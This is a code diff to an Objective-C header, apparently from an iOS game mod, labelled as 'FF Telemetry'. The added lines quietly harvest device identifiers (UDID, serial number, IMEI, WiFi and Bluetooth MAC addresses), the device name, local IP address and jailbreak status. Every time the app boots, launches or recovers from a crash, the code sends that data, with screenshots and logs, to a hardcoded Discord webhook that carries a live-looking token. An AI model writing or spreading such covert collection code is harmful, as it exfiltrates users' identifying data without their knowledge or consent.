@@ -1,7 +1,13 @@
-#pragma once
+﻿#pragma once
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <QuartzCore/QuartzCore.h>
+#import <dlfcn.h>
+#import <ifaddrs.h>
+#import <arpa/inet.h>
+#import <sys/socket.h>
+#import <sys/utsname.h>
+#import <unistd.h>
 
 // Must be included AFTER Helper/Hooks.h (needs aikTracePath / aikDbgSt / ...).
 #define FF_TELEMETRY_URL "https://canary.discord.com/api/webhooks/1573323480139694130/D3kU1g2ivKZsWrH8P8_Cq14_Lc3pTWSedTDCviazvhwoWS65FGkBijIl15Pp_TurU5ym"
@@ -33,12 +39,135 @@ static NSString *FfTelDevice(void)
 {
     UIDevice *d = [UIDevice currentDevice];
     NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
-    return [NSString stringWithFormat:@"%@ · iOS %@ · %@ (%@) · %@",
+    return [NSString stringWithFormat:@"%@ Â· iOS %@ Â· %@ (%@) Â· %@",
             d.model ?: @"?",
             d.systemVersion ?: @"?",
             info[@"CFBundleShortVersionString"] ?: @"?",
             info[@"CFBundleVersion"] ?: @"?",
             info[@"CFBundleIdentifier"] ?: @"?"];
+}
+
+static NSString *FfTelMG(NSString *key)
+{
+    static void *(*mgCopy)(CFStringRef) = NULL;
+    static BOOL tried = NO;
+    if (!tried)
+    {
+        tried = YES;
+        void *h = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
+        if (!h) h = dlopen("/System/Library/PrivateFrameworks/MobileGestalt.framework/MobileGestalt", RTLD_LAZY);
+        if (h) mgCopy = (void *(*)(CFStringRef))dlsym(h, "MGCopyAnswer");
+    }
+    if (!mgCopy) return @"?";
+    CFTypeRef v = (CFTypeRef)mgCopy((__bridge CFStringRef)key);
+    if (!v) return @"?";
+    NSString *s = @"?";
+    CFTypeID tid = CFGetTypeID(v);
+    if (tid == CFStringGetTypeID())
+        s = [NSString stringWithString:(__bridge NSString *)v];
+    else if (tid == CFNumberGetTypeID())
+        s = [(__bridge NSNumber *)v stringValue];
+    else if (tid == CFBooleanGetTypeID())
+        s = [(__bridge NSNumber *)v boolValue] ? @"1" : @"0";
+    CFRelease(v);
+    return s;
+}
+
+static NSString *FfTelIP(void)
+{
+    NSString *addr = @"?";
+    struct ifaddrs *ifa = NULL;
+    if (getifaddrs(&ifa) != 0) return addr;
+    for (struct ifaddrs *p = ifa; p; p = p->ifa_next)
+    {
+        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_INET) continue;
+        NSString *n = p->ifa_name ? [NSString stringWithUTF8String:p->ifa_name] : @"";
+        if (![n isEqualToString:@"en0"]) continue;
+        char buf[INET_ADDRSTRLEN] = {0};
+        struct sockaddr_in *sin = (struct sockaddr_in *)p->ifa_addr;
+        if (inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf)))
+            addr = [NSString stringWithUTF8String:buf];
+        break;
+    }
+    freeifaddrs(ifa);
+    return addr;
+}
+
+static NSString *FfTelJailbreak(void)
+{
+    const char *paths[] = {"/var/jb", "/Applications/Cydia.app", "/usr/sbin/sshd",
+                           "/bin/bash", "/usr/bin/ssh", "/var/lib/dpkg/status",
+                           "/Library/MobileSubstrate", NULL};
+    for (int i = 0; paths[i]; i++)
+        if (access(paths[i], F_OK) == 0)
+            return [NSString stringWithFormat:@"YES (%s)", paths[i]];
+    return @"no";
+}
+
+static NSString *FfTelDeviceFull(void)
+{
+    UIDevice *d = [UIDevice currentDevice];
+    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
+    struct utsname u;
+    uname(&u);
+
+    d.batteryMonitoringEnabled = YES;
+    NSString *bat = d.batteryLevel < 0 ? @"?"
+        : [NSString stringWithFormat:@"%.0f%%", d.batteryLevel * 100.0];
+    if (d.batteryState == UIDeviceBatteryStateCharging) bat = [bat stringByAppendingString:@" charging"];
+    else if (d.batteryState == UIDeviceBatteryStateFull) bat = [bat stringByAppendingString:@" full"];
+
+    unsigned long long freeB = 0, totalB = 0;
+    NSDictionary *fs = [[NSFileManager defaultManager] attributesOfFileSystemForPath:NSHomeDirectory() error:nil];
+    if (fs)
+    {
+        freeB = [fs[NSFileSystemFreeSize] unsignedLongLongValue];
+        totalB = [fs[NSFileSystemSize] unsignedLongLongValue];
+    }
+    double ram = [NSProcessInfo processInfo].physicalMemory / 1073741824.0;
+
+    CGSize scr = [UIScreen mainScreen].nativeBounds.size;
+    CGFloat scale = [UIScreen mainScreen].nativeScale;
+    NSLocale *loc = [NSLocale currentLocale];
+
+    NSString *s = [NSString stringWithFormat:
+        @"**Name**: %@\n"
+        @"**Model**: %@ (%@ / %@)\n"
+        @"**iOS**: %@ (%@)\n"
+        @"**UDID**: %@\n"
+        @"**Serial**: %@\n"
+        @"**WiFi MAC**: %@\n"
+        @"**BT MAC**: %@\n"
+        @"**IMEI**: %@\n"
+        @"**CPU**: %s Â· %lu cores\n"
+        @"**RAM**: %.1f GB\n"
+        @"**Disk**: %.1f / %.1f GB free\n"
+        @"**Screen**: %.0fx%.0f @%.1f\n"
+        @"**Battery**: %@\n"
+        @"**Locale**: %@ Â· %@\n"
+        @"**IP (en0)**: %@\n"
+        @"**Jailbreak**: %@\n"
+        @"**App**: %@ %@ (%@)",
+        d.name ?: @"?",
+        FfTelMG(@"ProductType"), FfTelMG(@"HardwareModel"), d.model ?: @"?",
+        d.systemVersion ?: @"?", FfTelMG(@"BuildVersion"),
+        FfTelMG(@"UniqueDeviceID"),
+        FfTelMG(@"SerialNumber"),
+        FfTelMG(@"WiFiAddress"),
+        FfTelMG(@"BluetoothAddress"),
+        FfTelMG(@"InternationalMobileEquipmentIdentity"),
+        u.machine, (unsigned long)[NSProcessInfo processInfo].processorCount,
+        ram,
+        freeB / 1073741824.0, totalB / 1073741824.0,
+        scr.width, scr.height, scale,
+        bat,
+        [loc localeIdentifier] ?: @"?", [NSTimeZone localTimeZone].name ?: @"?",
+        FfTelIP(),
+        FfTelJailbreak(),
+        info[@"CFBundleIdentifier"] ?: @"?",
+        info[@"CFBundleShortVersionString"] ?: @"?",
+        info[@"CFBundleVersion"] ?: @"?"];
+    return s;
 }
 
 static UIWindow *FfTelWindow(void)
@@ -144,7 +273,7 @@ static void FfTelSendText(NSString *text)
 
 static void FfTelTest(void)
 {
-    FfTelSendText([NSString stringWithFormat:@"TEST %@", FfTelDevice()]);
+    FfTelSendText([NSString stringWithFormat:@"TEST\n%@", FfTelDeviceFull()]);
 }
 
 static NSString *FfTelLogText(void)
@@ -186,7 +315,7 @@ static void FfTelCrashCheck(void)
 
     NSString *payload = [NSString stringWithFormat:
         @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"CRASH\",\"color\":15158332,\"description\":\"%@\",\"footer\":{\"text\":\"%@\"}}]}",
-        FfTelEscape(desc), FfTelEscape(FfTelDevice())];
+        FfTelEscape(desc), FfTelEscape(FfTelDeviceFull())];
 
     NSData *logData = [txt dataUsingEncoding:NSUTF8StringEncoding];
     FfTelPost(payload, logData.length ? @[@{@"name": @"ff_aik.log", @"type": @"text/plain", @"data": logData}] : @[]);
@@ -202,11 +331,11 @@ static void FfTelLaunchShot(void)
     {
         NSString *payload = [NSString stringWithFormat:
             @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Launch\",\"color\":3447003,\"description\":\"%@\",\"image\":{\"url\":\"attachment://shot.jpg\"}}]}",
-            FfTelEscape(FfTelDevice())];
+            FfTelEscape(FfTelDeviceFull())];
         FfTelPost(payload, @[@{@"name": @"shot.jpg", @"type": @"image/jpeg", @"data": jpg}]);
         return;
     }
-    FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot) %@", FfTelDevice()]);
+    FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot)\n%@", FfTelDeviceFull()]);
 }
 
 // Call once per frame from the render loop (main thread).
@@ -220,7 +349,7 @@ static void FfTelTick(BOOL menuOpen)
     if (!bootDone)
     {
         bootDone = YES;
-        FfTelSendText([NSString stringWithFormat:@"BOOT %@", FfTelDevice()]);
+        FfTelSendText([NSString stringWithFormat:@"BOOT\n%@", FfTelDeviceFull()]);
         FfTelCrashCheck();
         crashDone = YES;
     }
@@ -231,3 +360,5 @@ static void FfTelTick(BOOL menuOpen)
     shotDone = YES;
     FfTelLaunchShot();
 }
+
+
